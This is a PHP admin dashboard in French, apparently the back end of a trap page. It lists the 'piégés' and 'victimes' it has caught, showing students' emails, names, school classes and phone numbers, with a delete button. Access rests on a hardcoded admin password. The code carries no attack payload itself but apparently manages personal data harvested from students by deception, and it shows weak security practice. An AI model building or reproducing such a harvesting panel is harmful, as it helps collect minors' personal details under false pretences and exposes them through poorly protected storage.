<?php
// 1. SÉCURITÉ
$user_admin = "admin";
$pass_admin = "Faure2026"; 

if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_PW'] != $pass_admin || $_SERVER['PHP_AUTH_USER'] != $user_admin) {
    header('WWW-Authenticate: Basic realm="Acces Protege"');
    header('HTTP/1.0 401 Unauthorized');
    exit('<h1>Accès restreint</h1>');
}

// 2. CONNEXION
require '../forum_donne.php';

// 3. ACTION : Suppression d'une ligne spécifique
if (isset($_POST['delete_id'])) {
    $id_a_supprimer = $_POST['delete_id'];
    $stmt = $pdo->prepare("DELETE FROM participants WHERE id = ?");
    $stmt->execute([$id_a_supprimer]);
    header("Location: gestion.php?success=1");
    exit();
}

// 4. RÉCUPÉRATION DES DONNÉES
$count = $pdo->query("SELECT COUNT(*) FROM participants")->fetchColumn();
// Ajout de 'classe' et 'tel' dans la requête
$liste = $pdo->query("SELECT id, email, nom, prenom, classe, tel FROM participants ORDER BY id DESC")->fetchAll();
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Gestion des participants</title>
    <style>
        body { font-family: sans-serif; background: #0d1117; color: white; padding: 20px; }
        .container { max-width: 900px; margin: auto; background: #161b22; padding: 20px; border-radius: 10px; border: 1px solid #30363d; }
        h1 { color: #58a6ff; text-align: center; }
        .stats { font-size: 1.5rem; text-align: center; margin-bottom: 30px; color: #ff7b72; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; border-bottom: 1px solid #30363d; text-align: left; }
        th { color: #8b949e; }
        .btn-del { background: #da3633; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
        .btn-del:hover { background: #f85149; }
    </style>
</head>
<body>

    <div class="container">
        <h1>📊 GESTION DES PIÉGÉS</h1>
        <div class="stats">Total : <?php echo $count; ?></div>

        <table>
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Nom / Prénom</th>
                    <th>Classe</th>
                    <th>Téléphone</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach($liste as $p): ?>
                <tr>
                    <td><?php echo htmlspecialchars($p['email']); ?></td>
                    <td><?php echo htmlspecialchars($p['nom'] . ' ' . $p['prenom']); ?></td>
                    <td><?php echo htmlspecialchars($p['classe']); ?></td>
                    <td><?php echo htmlspecialchars($p['tel']); ?></td>
                    <td>
                        <form method="POST" onsubmit="return confirm('Supprimer cet élève ?');" style="display:inline;">
                            <input type="hidden" name="delete_id" value="<?php echo $p['id']; ?>">
                            <button type="submit" class="btn-del">Supprimer</button>
                        </form>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php if($count == 0) echo "<tr><td colspan='5' style='text-align:center;'>Aucune victime pour le moment.</td></tr>"; ?>
            </tbody>
        </table>
    </div>

    <p style="text-align:center; margin-top:20px;">
        <a href="../index.php" style="color: #58a6ff; text-decoration:none;">← Retour au site</a>
    </p>

</body>
</html>